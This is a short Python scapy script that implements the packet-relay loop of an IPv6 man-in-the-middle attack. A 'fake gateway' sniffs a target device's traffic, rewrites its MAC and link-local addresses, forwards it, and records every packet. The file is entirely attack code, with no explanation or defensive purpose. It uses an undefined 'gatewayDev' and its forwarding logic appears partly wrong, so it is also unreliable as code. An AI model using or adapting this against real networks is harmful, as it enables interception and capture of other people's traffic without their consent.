from scapy.all import *

def forwarder(fakegateway):
    while True:
        p = sniff(count=1,filter="ip6 && inbound")

        if p[0].getlayer(Ether).src == fakegateway.targetDevice.macaddr or p[0].getlayer(IPv6).src == fakegateway.targetDevice.linklocal:
            p[0].getlayer(Ether).src = fakegateway.macaddr
            p[0].getlayer(Ether).dst = gatewayDev.macaddr
            p[0].getlayer(IPv6).src = fakegateway.linklocal
            sendp(p,iface=conf.iface,verbose=0)
            fakegateway.Write(p[0])

        if p[0].getlayer(Ether).dst == fakegateway.macaddr or p[0].getlayer(IPv6).dst == fakegateway.linklocal:
            p[0].getlayer(Ether).src = fakegateway.macaddr
            p[0].getlayer(Ether).dst = gatewayDev.macaddr
            p[0].getlayer(IPv6).dst = gatewayDev.linklocal
            sendp(p,iface=conf.iface,verbose=0)
            fakegateway.Write(p[0])